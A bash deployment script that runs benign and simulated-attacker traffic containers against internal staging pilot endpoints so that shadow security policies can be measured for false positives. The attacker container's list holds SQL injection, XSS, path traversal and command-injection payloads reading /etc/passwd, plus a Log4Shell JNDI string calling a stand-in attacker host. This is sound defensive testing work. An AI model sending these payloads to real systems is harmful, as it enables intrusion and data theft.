#!/usr/bin/env bash
# W10-G2-01: traffic for the simulated pilot routes, so that the shadow
# policies see something every day (W10-S-01 counts suspected false
# positives per rule from it). Two long-running containers per environment:
#
#   <project>-pilot-benign    about 1 request/s, alternating
#                             POST /v1/verify (JSON) and POST /v1/upload
#                             (multipart, a small fake image), with varied,
#                             realistic field values;
#   <project>-pilot-attacker  one attack every 2 minutes from the
#                             attack corpus mix (SQLi, XSS, path
#                             traversal, Log4Shell), from its own address:
#                             fp-report excludes it (attack-sources.txt).
#
# Usage: deploy/staging/pilot-traffic.sh [--env staging|prod-sim] up|down|status
set -euo pipefail
here="$(cd "$(dirname "$0")" && pwd)"
env=staging
if [ "${1:-}" = "--env" ]; then env=${2:?}; shift 2; fi
case "$env" in
    staging) project=strata-staging state="$here/.state" ;;
    prod-sim) project=strata-prodsim state="$here/.state-prod-sim" ;;
    *) echo "pilot-traffic: --env staging|prod-sim" >&2; exit 2 ;;
esac
cmd=${1:-status}
die() { echo "pilot-traffic[$env]: $*" >&2; exit 1; }
say() { echo "pilot-traffic[$env]: $*"; }
net="${project}_default"
image=$(docker inspect -f '{{.Config.Image}}' "$project-pilot-verify" 2>/dev/null) \
    || die "no pilot nodes (deploy/staging/pilot.sh --env $env up)"

benign='
names=(an binh chi dung giang hoa khanh linh minh nam oanh phuong quang son trang uyen vy)
i=0
while :; do
    i=$((i + 1))
    n=${names[$((RANDOM % ${#names[@]}))]}
    if [ $((i % 2)) = 0 ]; then
        curl -s -o /dev/null -m 5 -X POST -H "Host: api.example.test" -H "Content-Type: application/json" \
            -H "User-Agent: example-mobile/3.$((RANDOM % 9)) (Android 14)" \
            -d "{\"document_id\":\"$((100000000 + RANDOM * RANDOM % 900000000))\",\"full_name\":\"Nguyen Van ${n^}\",\"birth_date\":\"19$((60 + RANDOM % 40))-0$((1 + RANDOM % 9))-1$((RANDOM % 9))\",\"note\":\"request $i, it is ok & fine\",\"channel\":\"app\"}" \
            http://pilot-verify/v1/verify
    else
        head -c $((2048 + RANDOM % 30000)) /dev/urandom > /tmp/photo.jpg
        curl -s -o /dev/null -m 10 -X POST -H "Host: api.example.test" -H "User-Agent: example-web/1.0" \
            -F "customer_id=$((RANDOM * 7))" -F "kind=id-front" -F "comment=photo of ${n} (front side)" \
            -F "file=@/tmp/photo.jpg;type=image/jpeg" http://pilot-upload/v1/upload
    fi
    sleep 1
done'

attacker='
attacks=(
  "verify|{\"document_id\":\"1 OR 1=1--\",\"full_name\":\"x\"}"
  "verify|{\"full_name\":\"<script>alert(1)</script>\"}"
  "verify|{\"note\":\"../../../../etc/passwd\"}"
  "upload|${jndi:ldap://attacker.example.test/a}"
  "verify|{\"document_id\":\"1; cat /etc/passwd\"}"
  "verify|{\"full_name\":\"admin'\''-- \",\"birth_date\":\"1 UNION SELECT password FROM users\"}"
)
while :; do
    a=${attacks[$((RANDOM % ${#attacks[@]}))]}
    route=${a%%|*} payload=${a#*|}
    if [ "$route" = upload ]; then
        curl -s -o /dev/null -m 5 -X POST -H "Host: api.example.test" -H "User-Agent: $payload" \
            -F "customer_id=1" -F "file=@/etc/hostname" http://pilot-upload/v1/upload
    else
        curl -s -o /dev/null -m 5 -X POST -H "Host: api.example.test" -H "Content-Type: application/json" \
            -d "$payload" http://pilot-verify/v1/verify
    fi
    sleep 120
done'

case "$cmd" in
up)
    for c in benign attacker; do
        docker rm -f "$project-pilot-$c" >/dev/null 2>&1 || true
        script=$benign; [ "$c" = attacker ] && script=$attacker
        docker run -d --name "$project-pilot-$c" --hostname "pilot-$c" --restart unless-stopped \
            --network "$net" --cpuset-cpus="${STAGING_CPUS:-14-15}" --label "strata.pilot=traffic-$c" \
            --entrypoint bash "$image" -c "$script" >/dev/null
    done
    ip=$(docker inspect -f "{{(index .NetworkSettings.Networks \"$net\").IPAddress}}" "$project-pilot-attacker")
    mkdir -p "$state/pilot"
    printf '# the simulated attacker of %s (pilot-traffic.sh), excluded from fp-report\n%s\n' "$env" "$ip" \
        > "$state/pilot/attack-sources.txt"
    say "benign and attacker traffic running; attacker $ip (written to $state/pilot/attack-sources.txt)" ;;
down)
    docker rm -f "$project-pilot-benign" "$project-pilot-attacker" >/dev/null 2>&1 || true
    say "traffic stopped" ;;
status)
    docker ps -a --filter "name=$project-pilot-" --format '{{.Names}} {{.Status}}' ;;
*) die "usage: pilot-traffic.sh [--env staging|prod-sim] up|down|status" ;;
esac
